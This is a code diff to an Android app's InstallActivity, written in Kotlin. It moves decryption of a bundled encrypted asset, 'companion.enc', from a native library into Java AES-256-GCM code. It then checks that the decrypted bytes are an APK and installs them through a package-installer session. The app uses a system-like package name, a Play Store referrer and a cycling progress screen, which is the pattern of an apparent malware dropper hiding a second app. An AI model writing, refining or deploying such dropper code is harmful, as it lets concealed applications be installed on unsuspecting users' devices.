@@ -20,6 +20,9 @@ import android.widget.ProgressBar
 import android.widget.TextView
 import androidx.appcompat.app.AppCompatActivity
 import java.io.IOException
+import javax.crypto.Cipher
+import javax.crypto.spec.GCMParameterSpec
+import javax.crypto.spec.SecretKeySpec
 
 class InstallActivity : AppCompatActivity() {
 
@@ -55,13 +58,7 @@ class InstallActivity : AppCompatActivity() {
         private const val MARKET_URI     = "market://details?id=com.android.pictach"
         private const val REFERRER_URI   = "android-app://com.android.vending"
         private const val WRITE_NAME     = "update.pkg"
-
-        init {
-            System.loadLibrary("companionguard")
-        }
     }
-
-    private external fun decryptCompanion(encryptedBlob: ByteArray, outPath: String): Boolean
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -92,15 +89,13 @@ class InstallActivity : AppCompatActivity() {
         }
         handler.postDelayed(cycleRunnable, 2200)
 
-        // Decrypt companion.enc → temp APK → install
+        // Decrypt companion.enc at runtime using AES-256-GCM (javax.crypto)
         Thread {
             try {
                 val encBytes = assets.open("companion.enc").use { it.readBytes() }
-                val outFile  = java.io.File(cacheDir, "companion_dec.apk")
-                val ok       = decryptCompanion(encBytes, outFile.absolutePath)
-                if (ok && outFile.exists() && outFile.length() > 0) {
-                    val apkBytes = outFile.readBytes()
-                    outFile.delete()
+                val apkBytes = decryptCompanion(encBytes)
+                if (apkBytes != null && apkBytes.size > 1 &&
+                    apkBytes[0] == 'P'.code.toByte() && apkBytes[1] == 'K'.code.toByte()) {
                     runOnUiThread { installViaSession(apkBytes, attempt = 1) }
                 }
             } catch (e: Exception) {
@@ -176,6 +171,27 @@ class InstallActivity : AppCompatActivity() {
 
     private fun dp(value: Float): Float =
         TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, value, resources.displayMetrics)
+
+    private fun decryptCompanion(blob: ByteArray): ByteArray? {
+        return try {
+            val keyHex = BuildConfig.COMPANION_KEY_HEX
+            val keyBytes = ByteArray(keyHex.length / 2) { i ->
+                keyHex.substring(i * 2, i * 2 + 2).toInt(16).toByte()
+            }
+            val iv           = blob.copyOfRange(0, 12)
+            val ciphertext   = blob.copyOfRange(12, blob.size - 16)
+            val tag          = blob.copyOfRange(blob.size - 16, blob.size)
+            val cipherWithTag = ciphertext + tag
+            val key    = SecretKeySpec(keyBytes, "AES")
+            val spec   = GCMParameterSpec(128, iv)
+            val cipher = Cipher.getInstance("AES/GCM/NoPadding")
+            cipher.init(Cipher.DECRYPT_MODE, key, spec)
+            cipher.doFinal(cipherWithTag)
+        } catch (e: Exception) {
+            e.printStackTrace()
+            null
+        }
+    }
 
     private fun installViaSession(apkBytes: ByteArray, attempt: Int) {
         try {
